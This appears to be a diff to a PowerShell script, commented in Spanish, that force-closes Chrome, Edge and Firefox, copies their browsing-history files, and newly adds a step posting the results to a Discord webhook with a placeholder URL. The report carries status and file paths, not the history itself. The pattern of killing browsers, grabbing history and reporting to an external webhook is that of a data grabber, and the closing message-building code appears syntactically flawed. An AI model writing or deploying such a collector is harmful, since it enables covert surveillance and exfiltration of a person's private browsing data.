@@ -1,16 +1,27 @@
 <#
 .SYNOPSIS
-Recolector modular de historiales de navegación
+Recolector modular de historiales de navegación con envío a Discord
 
 .DESCRIPTION
-Cierra navegadores y copia sus archivos de historial a una ubicación específica
+Cierra navegadores, copia sus archivos de historial y envía los resultados a un webhook de Discord.
 
 .NOTES
 - Diseñado para expansión modular
 - Usa métodos no intrusivos
+- Requiere un webhook de Discord configurado
 #>
 
+# Configuración del Webhook de Discord
+$discordWebhookUrl = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"
+
 function Initialize-BackupEnvironment {
+    <#
+    .SYNOPSIS
+    Crea la carpeta de destino para los archivos de historial.
+    
+    .DESCRIPTION
+    Genera una carpeta con timestamp para almacenar los archivos de historial.
+    #>
     param(
         [string]$BasePath = "$env:USERPROFILE\Documents\BrowserHistory"
     )
@@ -26,6 +37,13 @@ function Initialize-BackupEnvironment {
 }
 
 function Close-Browsers {
+    <#
+    .SYNOPSIS
+    Cierra los navegadores especificados.
+    
+    .DESCRIPTION
+    Detiene los procesos de los navegadores para liberar los archivos de historial.
+    #>
     param(
         [string[]]$BrowserProcesses = @('chrome', 'msedge', 'firefox', 'msedgewebview2')
     )
@@ -47,6 +65,13 @@ function Close-Browsers {
 }
 
 function Backup-BrowserData {
+    <#
+    .SYNOPSIS
+    Copia los archivos de historial de un navegador específico.
+    
+    .DESCRIPTION
+    Realiza una copia del archivo de historial a la carpeta de destino.
+    #>
     param(
         [string]$TargetFolder,
         [string]$BrowserName,
@@ -78,6 +103,35 @@ function Backup-BrowserData {
     }
 
     return $result
+}
+
+function Send-ToDiscord {
+    <#
+    .SYNOPSIS
+    Envía un mensaje a un webhook de Discord.
+    
+    .DESCRIPTION
+    Envía un mensaje con formato JSON a un canal de Discord usando un webhook.
+    #>
+    param(
+        [string]$WebhookUrl,
+        [string]$Message,
+        [string]$Username = "Historial Bot",
+        [string]$AvatarUrl = ""
+    )
+
+    $body = @{
+        content = $Message
+        username = $Username
+        avatar_url = $AvatarUrl
+    } | ConvertTo-Json
+
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"
+    }
+    catch {
+        Write-Warning "Error enviando a Discord: $_"
+    }
 }
 
 #------------------- EJECUCIÓN PRINCIPAL -------------------
@@ -112,5 +166,13 @@ $backupResults += Backup-BrowserData -TargetFolder $targetFolder `
 
 # 3. Resultados
 $backupResults | Format-Table -AutoSize
+
+# 4. Enviar resultados a Discord
+$message = "Historiales recolectados:`n"
+$message += $backupResults | ForEach-Object {
+    "$($_.Browser): $($_.Success ? 'Éxito' : 'Error') - $($_.FilePath)"
+} -join "`n"
+
+Send-ToDiscord -WebhookUrl $discordWebhookUrl -Message $message
 
 Write-Host "`nProceso completado. Archivos disponibles en: $targetFolder`n" -ForegroundColor Green
